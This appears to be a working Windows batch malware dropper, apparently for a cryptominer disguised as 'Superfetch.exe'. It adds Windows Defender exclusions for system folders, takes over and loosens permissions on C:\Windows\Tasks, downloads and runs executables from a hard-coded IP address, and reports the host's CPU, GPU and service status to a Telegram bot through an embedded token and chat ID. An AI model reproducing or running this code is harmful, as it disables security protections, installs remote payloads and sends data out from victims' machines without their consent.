@echo off
chcp 65001
TIMEOUT /T 600 /NOBREAK
powershell Add-MpPreference -ExclusionPath c:\windows\migration\ , c:\users\kbtgt\desktop\ , C:\Windows\tasks\ , C:\Windows\ , C:\Windows\Logs\ , C:\Windows\SysWOW64\ , %SystemRoot%\System32\WindowsPowerShell\v1.0\ , C:\ProgramData\
tasklist /FI "IMAGENAME eq Superfetch.exe" 2>NUL | find /I /N "Superfetch.exe">NUL
if "%ERRORLEVEL%"=="0" exit
if "%ERRORLEVEL%"=="1" goto 1

:1
takeown /f c:\windows\tasks
TIMEOUT /T 10 /NOBREAK
icacls "C:\Windows\Tasks" /inheritance:e /grant "*S-1-1-0:(R,REA,RA,RD)" "*S-1-5-7:(R,REA,RA,RD)"
icacls "C:\Windows\Tasks" /inheritance:e /grant "SYSTEM:(R,REA,RA,RD)"
icacls "C:\Windows\Tasks" /inheritance:e /grant "Administrators:(R,REA,RA,RD)"
icacls "C:\Windows\Tasks" /inheritance:e /grant "Users:(R,REA,RA,RD)"
icacls "C:\Windows\Tasks" /inheritance:e /grant "%username%:(R,REA,RA,RD)"
icacls "C:\Windows\Tasks" /inheritance:e /grant "%domain%%username%:(R,REA,RA,RD)"
icacls "C:\Windows\Tasks" /inheritance:e /grant "EVERYONE:(R,REA,RA,RD)"

TIMEOUT /T 10 /NOBREAK
c:\programdata\migrate.exe -p4432
TIMEOUT /T 3 /NOBREAK
powershell "(new-object System.Net.WebClient).DownloadFile('http://45.81.224.130/any.exe','c:\windows\migration\any.exe')"
TIMEOUT /T 3 /NOBREAK
c:\windows\migration\any.exe
TIMEOUT /T 60 /NOBREAK
tasklist /FI "IMAGENAME eq Superfetch.exe" 2>NUL | find /I /N "Superfetch.exe">NUL
if "%ERRORLEVEL%"=="0" goto 4
if "%ERRORLEVEL%"=="1" goto 2

:2
c:\windows\migrate.exe -p4432
TIMEOUT /T 60 /NOBREAK
tasklist /FI "IMAGENAME eq Superfetch.exe" 2>NUL | find /I /N "Superfetch.exe">NUL
if "%ERRORLEVEL%"=="0" goto 4
if "%ERRORLEVEL%"=="1" goto 3

:3
mkdir c:\windows\migration\
powershell "(new-object System.Net.WebClient).DownloadFile('http://45.81.224.130/migrate.exe','c:\windows\migration\migrate.exe')"
TIMEOUT /T 10 /NOBREAK
c:\windows\migration\migrate.exe -p4432
TIMEOUT /T 60 /NOBREAK
goto 4

:4
powershell "(new-object System.Net.WebClient).DownloadFile('http://45.81.224.130/curl.exe','c:\windows\curl.exe')"
For /F "Tokens=2 Delims==" %%J In ('WMIC CPU Get Name /Value^|FindStr .') Do Call :Convert "%%J"
:Convert
set cpu=%~1

FOR /F "tokens=2 delims==" %%J IN ('WMIC /Node:localhost Path Win32_VideoController Get Name /Value^| FIND.EXE "="') Do Call :Convert2 "%%J"

:Convert2
set gpu=%~1

tasklist /FI "IMAGENAME eq Superfetch.exe" 2>NUL | find /I /N "Superfetch.exe">NUL
if "%ERRORLEVEL%"=="0" set run=SERVICE WMService RUN
if "%ERRORLEVEL%"=="1" set run=SERVICE WMService NOT RUN

set token="5086556714:AAF7DbEW7CWKb1GEIy6_inxVlrGJ39JUUBM"
set chat_id="552691400"
set MESSAGE=%computername%CORE%NUMBER_OF_PROCESSORS%%cpu%%gpu%%run%
set MESSAGE2= 
c:\windows\curl.exe --insecure --data chat_id=%chat_id% --data parse-mode=markdown --data-urlencode text="%MESSAGE%" "https://api.telegram.org/bot%token%/sendMessage"
exit
